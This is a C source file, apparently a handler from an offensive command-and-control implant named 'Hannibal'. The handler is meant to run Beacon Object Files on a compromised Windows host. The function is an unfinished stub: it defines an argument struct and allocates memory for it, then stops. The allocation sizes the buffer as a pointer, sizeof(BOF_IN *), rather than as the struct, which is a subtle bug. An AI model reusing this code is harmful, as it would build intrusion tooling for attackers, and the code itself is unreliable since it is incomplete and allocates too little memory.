#include "config.h"

#ifdef INCLUDE_CMD_BOF

#include "hannibal_tasking.h"

SECTION_CODE void cmd_bof(TASK t)
{
    HANNIBAL_INSTANCE_PTR

    CMD_BOF *bof = (CMD_BOF *)t.cmd;

    typedef struct _BOF_IN {
        LPVOID args;
        int arg_size;
        LPVOID hannibal_instance;
        char *controller_uuid;
    } BOF_IN;

    BOF_IN *in = (BOF_IN *)hannibal_instance_ptr->Win32.VirtualAlloc(
        NULL, 
        sizeof(BOF_IN *), 
        MEM_COMMIT, 
        PAGE_READWRITE
    );
    
}
#endif